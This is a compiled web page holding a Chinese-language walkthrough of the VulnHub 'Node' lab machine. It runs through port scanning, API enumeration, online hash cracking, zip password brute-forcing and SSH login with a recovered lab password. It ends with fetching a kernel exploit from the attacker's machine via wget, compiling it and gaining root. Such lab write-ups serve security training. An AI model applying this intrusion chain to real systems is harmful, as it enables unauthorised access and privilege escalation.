import{_ as s,c as i,o as a,a5 as n}from"./chunks/framework.ByOCcFwP.js";const g=JSON.parse('{"title":"Node 靶机","description":"","frontmatter":{"title":"Node 靶机","date":"2021-02-27T10:01:48.000Z","categories":"security","tags":["drone"]},"headers":[],"relativePath":"security/drone-node.md","filePath":"security/drone-node.md"}'),t={name:"security/drone-node.md"},l=n(`<p><strong>靶机下载</strong>: <a href="https://www.vulnhub.com/entry/node-1,252/" target="_blank" rel="noreferrer">https://www.vulnhub.com/entry/node-1,252/</a></p><p>渗透目标是通过 VMWare 安装的 Node 虚拟机, 网络连接方式为仅主机, 目标 IP 通过 DHCP 分配</p><h2 id="主机发现" tabindex="-1">主机发现 <a class="header-anchor" href="#主机发现" aria-label="Permalink to &quot;主机发现&quot;">​</a></h2><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[root@kali </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">~</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]# arp-scan -I eth0 -l</span></span></code></pre></div><h2 id="端口探测" tabindex="-1">端口探测 <a class="header-anchor" href="#端口探测" aria-label="Permalink to &quot;端口探测&quot;">​</a></h2><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[root@kali </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">~</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]# nmap -sS -p1-65535 -v 192.168.64.129</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">PORT</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">     STATE</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> SERVICE</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">22/tcp</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">   open</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">  ssh</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">3000/tcp</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> open</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">  ppp</span></span></code></pre></div><h2 id="服务识别" tabindex="-1">服务识别 <a class="header-anchor" href="#服务识别" aria-label="Permalink to &quot;服务识别&quot;">​</a></h2><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[root@kali </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">~</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]# nmap -sV -T4 -p22,3000 192.168.64.129</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/node_drone/port_service.png" alt="port_service"></p><h2 id="查找漏洞" tabindex="-1">查找漏洞 <a class="header-anchor" href="#查找漏洞" aria-label="Permalink to &quot;查找漏洞&quot;">​</a></h2><h3 id="扫描目录" tabindex="-1">扫描目录 <a class="header-anchor" href="#扫描目录" aria-label="Permalink to &quot;扫描目录&quot;">​</a></h3><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[root@kali </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">~</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]# dirb http://192.168.64.129:3000 -f </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">~</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/web_file_list.txt</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/node_drone/scan_web_file.png" alt="scan_web_file"></p><p>没有扫描到 web 目录</p><h3 id="使用burpsuite-探测" tabindex="-1">使用BurpSuite 探测 <a class="header-anchor" href="#使用burpsuite-探测" aria-label="Permalink to &quot;使用BurpSuite 探测&quot;">​</a></h3><p>获取到 <a href="http://192.168.64.129:3000/api/users/latest" target="_blank" rel="noreferrer">http://192.168.64.129:3000/api/users/latest</a> 中 JSON 格式的用户数据</p><p><img src="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/node_drone/api_user.png" alt="api_user"></p><p>尝试去掉 latest, 在 <a href="http://192.168.64.129:3000/api/users/" target="_blank" rel="noreferrer">http://192.168.64.129:3000/api/users/</a> 中发现了管理员用户</p><p><img src="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/node_drone/user_admin.png" alt="user_admin"></p><h3 id="尝试破解密码" tabindex="-1">尝试破解密码 <a class="header-anchor" href="#尝试破解密码" aria-label="Permalink to &quot;尝试破解密码&quot;">​</a></h3><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[root@kali </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">~</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]# hash-identifier dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Possible</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Hashs:</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[+] SHA-256</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[+] Haval-256</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Least</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Possible</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Hashs:</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[+] GOST R 34.11-94</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[+] RipeMD-256</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[+] SNEFRU-256</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[+] SHA-256(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">HMAC</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[+] Haval-256(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">HMAC</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[+] RipeMD-256(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">HMAC</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[+] SNEFRU-256(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">HMAC</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[+] SHA-256(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">md5($pass</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">))</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[+] SHA-256(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sha1($pass</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">))</span></span></code></pre></div><p>SHA-256 在线解密 <a href="https://md5decrypt.net/Sha256/" target="_blank" rel="noreferrer">https://md5decrypt.net/Sha256/</a></p><p><img src="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/node_drone/online_decrypter.png" alt="online_decrypter"></p><h3 id="用管理员登录" tabindex="-1">用管理员登录 <a class="header-anchor" href="#用管理员登录" aria-label="Permalink to &quot;用管理员登录&quot;">​</a></h3><p>管理员登录后可以下载备份文件</p><p><img src="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/node_drone/down_bak.png" alt="down_bak"></p><h3 id="尝试解密备份" tabindex="-1">尝试解密备份 <a class="header-anchor" href="#尝试解密备份" aria-label="Permalink to &quot;尝试解密备份&quot;">​</a></h3><p>文件内容为 ASCII 文本, 预览后疑似 BASE64 编码</p><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[root@kali </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">~</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]# file myplace.backup</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">myplace.backup:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ASCII</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> text,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> with</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> very</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> long</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> lines,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> with</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> no</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> line</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> terminators</span></span></code></pre></div><p>尝试 BASE64 解码, 得到 zip 压缩包, 但是解压需要密码</p><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[root@kali </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">~</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]# cat myplace.backup </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">|</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> bash64</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -d</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> &gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> myplace.bak</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[root@kali </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">~</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]# file myplace.bak</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">myplace.bak:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Zip</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> archive</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> data,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> at</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> least</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> v1.0</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> to</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> extract</span></span></code></pre></div><p>尝试破解压缩包密码</p><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[root@kali </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">~</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]# fcrackzip -v -b -u -c a -p magicaaaa myplace.bak</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">...</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ...</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">PASSWORD</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> FOUND!!!!:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> pw</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ==</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> magicword</span></span></code></pre></div><p>解压后寻找可用信息</p><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[root@kali </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">~</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]# unzip myplace.bak</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[root@kali </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">~</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]# more var/www/myplace/app.js</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">...</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ...</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">const</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> url</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">...</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ...</span></span></code></pre></div><h3 id="尝试使用-mongodb-用户-ssh-登录" tabindex="-1">尝试使用 MongoDB 用户 ssh 登录 <a class="header-anchor" href="#尝试使用-mongodb-用户-ssh-登录" aria-label="Permalink to &quot;尝试使用 MongoDB 用户 ssh 登录&quot;">​</a></h3><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[root@kali </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">~</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]# ssh mark@192.168.64.129    </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#密码:5AYRft73VtFpc84k</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[mark@node </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">~</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]$ uname -a</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Linux</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> node</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 4.4.0-93-generic</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"> #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[mark@node </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">~</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]$ cat /etc/issue</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Ubuntu</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 16.04.3</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> LTS</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \\n</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \\l</span></span></code></pre></div><h3 id="漏洞提权" tabindex="-1">漏洞提权 <a class="header-anchor" href="#漏洞提权" aria-label="Permalink to &quot;漏洞提权&quot;">​</a></h3><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[root@kali </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">~</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]# searchsploit Ubuntu 16.04</span></span></code></pre></div><p>发现漏洞提权代码</p><p><img src="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/node_drone/ubuntu_sploit.png" alt="ubuntu_sploit"></p><p>将提权代码传到靶机</p><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[root@kali </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">~</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]# systemctl start apache2.service</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[root@kali </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">~</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]# cp /usr/share/exploitdb/exploits/linux/local/44298.c /var/www/html/</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[mark@node /tmp]$ wget http://192.168.64.128/44298.c    </span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#192.168.64.128 为 Kali 虚拟机 IP</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[mark@node /tmp]$ gcc 44298.c -o exp</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[mark@node /tmp]$ ./exp</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[root@node /tmp]# whoami</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">root</span></span></code></pre></div>`,43),h=[l];function e(p,k,r,d,E,o){return a(),i("div",null,h)}const y=s(t,[["render",e]]);export{g as __pageData,y as default};
